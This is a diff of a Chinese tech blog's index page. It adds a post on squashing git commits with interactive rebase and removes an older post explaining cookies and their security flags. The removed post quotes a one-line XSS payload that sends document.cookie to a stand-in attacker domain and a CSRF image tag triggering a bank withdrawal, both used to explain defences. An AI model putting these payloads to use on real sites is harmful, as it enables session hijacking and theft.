@@ -261,6 +261,165 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/git/git-rebase-merge-commit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="gdccwxx">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gdccwxx">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/git/git-rebase-merge-commit/" itemprop="url">git —— 通过 rebase 合并 commit</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-08T12:41:58+08:00">
+                2021-10-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在项目开发时候，经常会遇到明明是同一个修改，在一些不可抗拒因素下，导致本应该是一次提交的 commit 被多次提交。在开源社区往往对commit message 有着强迫症似的提交。</p>
+<p>本篇的目的就是通过 rebase 合并 commit。</p>
+<h2 id="场景再现"><a href="#场景再现" class="headerlink" title="场景再现"></a>场景再现</h2><p>分支: <code>master</code><br>提交次数: <code>2次</code><br>git log:</p>
+<ul>
+<li>初始化: 第二次提交 (<strong>当前最新commit</strong>)</li>
+<li>初始化: 第一次提交(需要合并)</li>
+<li>初始化: init（不需要合并）</li>
+</ul>
+<p><img src="/git/git-rebase-merge-commit/./git-log.png" alt="git-log"></p>
+<h3 id="期望场景"><a href="#期望场景" class="headerlink" title="期望场景"></a>期望场景</h3><p>合并commit: <code>e4a5545b</code> 和 <code>1bc8133d</code><br>git log: <code>初始化文件</code></p>
+<h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="压缩-commit-命令"><a href="#压缩-commit-命令" class="headerlink" title="压缩 commit 命令"></a>压缩 commit 命令</h3><p>命令：<code>git rebase -i [start point] [end point]</code> or <code>git rebase -i HEAD~[number]</code> 可使用任意一种</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i 03dcc16f // commit号是需要合并提交的前一次提交</span><br><span class="line">// or </span><br><span class="line">git rebase -i 03dcc16f 1bc8133d</span><br><span class="line">// or</span><br><span class="line">git rebase -i HEAD~2</span><br></pre></td></tr></table></figure>
+<p>键入命令后，commit 信息由最开始到最近提交。即：最上面是最开始的提交，最下面是最近提交。<br><img src="/git/git-rebase-merge-commit/./git-rebase-pick.png" alt="git-rebase-pick"></p>
+<h3 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h3><h4 id="1-命令解析："><a href="#1-命令解析：" class="headerlink" title="1. 命令解析："></a>1. 命令解析：</h4><ul>
+<li><code>pick</code>: 要执行这个 commit</li>
+<li><code>squash</code> : 当前 commit 会被合并到前一个 commit</li>
+<li>…</li>
+</ul>
+<h4 id="2-操作-rebase-i"><a href="#2-操作-rebase-i" class="headerlink" title="2. 操作 rebase -i"></a>2. 操作 rebase -i</h4><ul>
+<li>将 <code>除了第一条</code> 的 <code>pick</code> 都改为 <code>squash</code> 或者 <code>s</code></li>
+<li>vi <code>:wq</code> 保存退出</li>
+</ul>
+<p><img src="/git/git-rebase-merge-commit/./git-rebase-s.png" alt="git-rebase-s"></p>
+<h4 id="3-git-rebase-基础操作-非必要无需此步"><a href="#3-git-rebase-基础操作-非必要无需此步" class="headerlink" title="3. git rebase 基础操作(非必要无需此步)"></a>3. git rebase 基础操作(非必要无需此步)</h4><p>git 会压缩提交历史，若有冲突，需要进行修改，修改的时候保留最新的历史记录。</p>
+<ul>
+<li><p>if 执行压缩：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git rebase --continue</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>else 如果放弃此次压缩：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase --abort</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="4-修改-commit-message"><a href="#4-修改-commit-message" class="headerlink" title="4. 修改 commit message"></a>4. 修改 commit message</h4><p>若无冲突 or 冲突已 fix，则会出现一个 commit message 编辑页面。</p>
+<p>修改 commit message， vi <code>:wq</code> 保存退出。</p>
+<p><img src="/git/git-rebase-merge-commit/./modify-commit-message.png" alt="modify-commit-message"></p>
+<h4 id="5-查看修改后的内容"><a href="#5-查看修改后的内容" class="headerlink" title="5. 查看修改后的内容"></a>5. 查看修改后的内容</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+<p><img src="/git/git-rebase-merge-commit/./modified-git-log.png" alt="modified-git-log"></p>
+<p>已经将 <code>e4a5545b</code> 和 <code>1bc8133d</code> 合并成一条 <code>510bfd34</code>  ✅</p>
+<h4 id="6-同步到远端"><a href="#6-同步到远端" class="headerlink" title="6. 同步到远端"></a>6. 同步到远端</h4><p>使用 <code>git push -f</code> or <code>git push --force</code> 强制推送。git 记录本地已经改动，和远端有冲突，需要用 <code>force push</code> 解决<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git push -f</span><br><span class="line">// or</span><br><span class="line">git push --force</span><br></pre></td></tr></table></figure></p>
+<p>再看远端的仓库，记录已经改变～</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1906,274 +2065,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/HTTP/basic-cookies/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="gdccwxx">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="gdccwxx">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/HTTP/basic-cookies/" itemprop="url">管中窥豹看Cookie</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T21:14:04+08:00">
-                2019-04-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">详细参数</a>。</p>
-<h2 id="Cookie介绍"><a href="#Cookie介绍" class="headerlink" title="Cookie介绍"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p>
-<blockquote>
-<p><strong>Wikipedia:</strong></p>
-<p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p>
-<p><strong>MDN:</strong></p>
-<p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
-</blockquote>
-<p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p>
-<p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p>
-<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/HTTP/basic-cookies/./exchange-cookies.png" alt="cookies消息传递">Cookies的传输</div>
-
-<p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p>
-<h2 id="Cookie的特性"><a href="#Cookie的特性" class="headerlink" title="Cookie的特性"></a>Cookie的特性</h2><h3 id="前端数据存储及读写"><a href="#前端数据存储及读写" class="headerlink" title="前端数据存储及读写"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">document.cookie</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class="line"><span class="comment">// 可设置path，domain，max-age，expires，secure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() - <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 修改cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=false; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 查找cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">"需要查找的cookie"</span>).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure></p>
-<h3 id="后端通过http头设置"><a href="#后端通过http头设置" class="headerlink" title="后端通过http头设置"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">参数</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以nodejs为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">response.getHeader(<span class="string">"Cookie"</span>);</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">response.setHeader(<span class="string">"Cookie"</span>, [<span class="string">"name=gdccwxx"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以koa为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">ctx.cookies.get(name, [options])</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure></p>
-<h3 id="请求时通过http头传给后端"><a href="#请求时通过http头传给后端" class="headerlink" title="请求时通过http头传给后端"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p>
-<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/HTTP/basic-cookies/./font-transfer-cookie.png" alt="请求Google">请求通过http头传送给后端</div>
-
-<h3 id="遵守同源策略"><a href="#遵守同源策略" class="headerlink" title="遵守同源策略"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p>
-<h2 id="Cookie作用及用途"><a href="#Cookie作用及用途" class="headerlink" title="Cookie作用及用途"></a>Cookie作用及用途</h2><h3 id="Cookie的作用"><a href="#Cookie的作用" class="headerlink" title="Cookie的作用"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p>
-<div style="width: 80%; margin: 0 auto; text-align: center"><br>    <img src="/HTTP/basic-cookies/./out-path-cookie.png" alt="在主页的cookie"><br><br><br>  在google.com的cookie<br><br><br>  <img src="/HTTP/basic-cookies/./in-path-cookie.png" alt="在搜索的cookie"><br><br><br>  在google.com/search的cookie<br><br><br></div>
-
-<p>正因为cookie的作用域，使得cookie存储有着多样性。</p>
-<p><strong>存储未登陆时用户唯一标识</strong></p>
-<p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p>
-<p>以新浪微博为例：</p>
-<div style="width: 80%; margin: 0 auto; text-align: center"><br><img src="/HTTP/basic-cookies/./unlogin-cookie.png" alt="未登陆状态下的cookie"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div>
-
-<p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p>
-<p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p>
-<p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p>
-<h3 id="Cookie的用途"><a href="#Cookie的用途" class="headerlink" title="Cookie的用途"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p>
-<ul>
-<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
-<li>个性化设置（如用户自定义设置、主题等）</li>
-<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
-</ul>
-<h2 id="Cookie-的安全策略"><a href="#Cookie-的安全策略" class="headerlink" title="Cookie 的安全策略"></a>Cookie 的安全策略</h2><h3 id="Cookie与XSS的关系"><a href="#Cookie与XSS的关系" class="headerlink" title="Cookie与XSS的关系"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></p>
-<p>这种情况下的cookie则会发送到攻击者的网站。</p>
-<h4 id="分析XSS攻击："><a href="#分析XSS攻击：" class="headerlink" title="分析XSS攻击："></a>分析XSS攻击：</h4><ul>
-<li>会话被劫持</li>
-<li>通过document获取cookie</li>
-</ul>
-<h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><ul>
-<li>会话劫持：使用cookie中Secure标识</li>
-<li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li>
-</ul>
-<h4 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p>
-<blockquote>
-<p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p>
-</blockquote>
-<p>用法：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure>
-<p><strong>HttpOnly</strong></p>
-<blockquote>
-<p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和  <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p>
-</blockquote>
-<p>用法：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure>
-<h3 id="Cookie与CSRF的关系"><a href="#Cookie与CSRF的关系" class="headerlink" title="Cookie与CSRF的关系"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p>
-<h4 id="分析CSRF攻击"><a href="#分析CSRF攻击" class="headerlink" title="分析CSRF攻击"></a>分析CSRF攻击</h4><ul>
-<li>被攻击者本地Cookie信息没有过期</li>
-<li>银行转账系统无二次确认，直接转账</li>
-<li>第三方网站（不安全的聊天室或论坛）加载请求</li>
-<li>攻击者无法读写Cookie</li>
-</ul>
-<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul>
-<li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li>
-<li>增加二次确认：目标网站对敏感操作无二次确认</li>
-<li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li>
-<li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li>
-</ul>
-<h4 id="参数介绍-1"><a href="#参数介绍-1" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p>
-<blockquote>
-<p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p>
-</blockquote>
-<p>用法：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite <span class="comment">// default SameSite=Strict</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure>
-<table>
-<thead>
-<tr>
-<th style="text-align:left"><strong>请求类型</strong></th>
-<th><strong>例子</strong></th>
-<th><strong>非 SameSit</strong></th>
-<th><strong>SameSite = Lax</strong></th>
-<th><strong>SameSite = Strict</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">link</td>
-<td>&lt;a href=”…”></td>
-<td>Y</td>
-<td>Y</td>
-<td>N</td>
-</tr>
-<tr>
-<td style="text-align:left">prerender</td>
-<td>\&lt;link rel=”prerender” href=”…”></td>
-<td>Y</td>
-<td>Y</td>
-<td>N</td>
-</tr>
-<tr>
-<td style="text-align:left">form get</td>
-<td>&lt;form method=”get” action=”…”></td>
-<td>Y</td>
-<td>Y</td>
-<td>N</td>
-</tr>
-<tr>
-<td style="text-align:left">form post</td>
-<td>&lt;form method=”post” action=”…”></td>
-<td>Y</td>
-<td>N</td>
-<td>N</td>
-</tr>
-<tr>
-<td style="text-align:left">iframe</td>
-<td>&lt;iframe src=”…”></td>
-<td>Y</td>
-<td>N</td>
-<td>N</td>
-</tr>
-<tr>
-<td style="text-align:left">ajax</td>
-<td>$.get(‘…’)</td>
-<td>Y</td>
-<td>N</td>
-<td>N</td>
-</tr>
-<tr>
-<td style="text-align:left">image</td>
-<td>&lt;img src=”…”></td>
-<td>Y</td>
-<td>N</td>
-<td>N</td>
-</tr>
-</tbody>
-</table>
-<h2 id="要点总结："><a href="#要点总结：" class="headerlink" title="要点总结："></a>要点总结：</h2><ul>
-<li><strong>Cookie是服务器保存在本地的数据块</strong></li>
-<li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li>
-<li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li>
-<li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li>
-<li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li>
-<li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2224,7 +2115,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2237,7 +2128,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
